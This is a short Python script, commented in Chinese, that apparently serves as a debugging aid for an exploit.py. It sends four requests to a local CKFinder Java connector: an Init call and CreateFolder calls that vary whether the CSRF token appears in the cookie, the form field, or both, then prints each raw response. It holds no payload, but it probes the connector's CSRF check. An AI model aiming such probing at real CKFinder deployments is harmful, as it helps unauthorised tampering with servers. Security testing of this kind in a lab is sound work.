#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""最小对照：复刻 exploit.py 的 CreateFolder 调用，打印请求与原始响应。"""
import urllib.error
import urllib.parse
import urllib.request

TOKEN = "0123456789abcdef0123456789abcdef01234567"
EP = "http://127.0.0.1:8080/ckfinder/core/connector/java/connector.java"


def call(label, fields, cookie=True, hdr=True):
    payload = dict(fields)
    payload.setdefault("CKFinderCommand", "true")
    body = urllib.parse.urlencode(payload).encode()
    req = urllib.request.Request(EP, data=body, method="POST")
    if cookie:
        req.add_header("Cookie", "ckCsrfToken=" + TOKEN)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    print("--- %s ---" % label)
    print("    body: " + body.decode())
    if cookie:
        print("    Cookie: ckCsrfToken=%s" % TOKEN)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            text = r.read().decode("utf-8", "replace")
            print("    HTTP %s  %s" % (r.status, text[:300]))
    except urllib.error.HTTPError as e:
        print("    HTTPError %s  %s" % (e.code, e.read().decode("utf-8", "replace")[:300]))
    print()


call("Init（基线，应 Error 0）",
     {"command": "Init", "type": "Images", "currentFolder": "/", "ckCsrfToken": TOKEN})

call("CreateFolder 带 cookie（exploit.py 的形态）",
     {"command": "CreateFolder", "NewFolderName": "xd1", "type": "Images",
      "currentFolder": "/", "ckCsrfToken": TOKEN})

call("CreateFolder 去掉 ckCsrfToken 表单参数（只留 cookie）",
     {"command": "CreateFolder", "NewFolderName": "xd2", "type": "Images",
      "currentFolder": "/"})

call("CreateFolder 不带 Cookie 头（预期 CSRF 109）",
     {"command": "CreateFolder", "NewFolderName": "xd3", "type": "Images",
      "currentFolder": "/", "ckCsrfToken": TOKEN}, cookie=False)
